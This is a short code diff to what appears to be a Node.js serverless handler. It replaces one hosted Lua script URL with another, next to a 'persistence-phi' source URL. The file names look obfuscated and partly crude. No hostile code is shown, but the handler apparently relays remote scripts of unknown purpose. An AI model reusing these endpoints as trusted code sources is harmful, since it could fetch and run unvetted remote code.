@@ -1,4 +1,4 @@
-const SCRIPT_URL = "https://cucumber2347.vercel.app/assets/scriptoooooocucucumebebbenfaeolneanol.lua";
+const SCRIPT_URL = "https://persistence-phi.vercel.app/yahuisosiebanatsukoeblantupoisosimoihui.lua";
 const SOURCE_URL = "https://persistence-phi.vercel.app/?stage=source";
 
 module.exports = async (req, res) => {
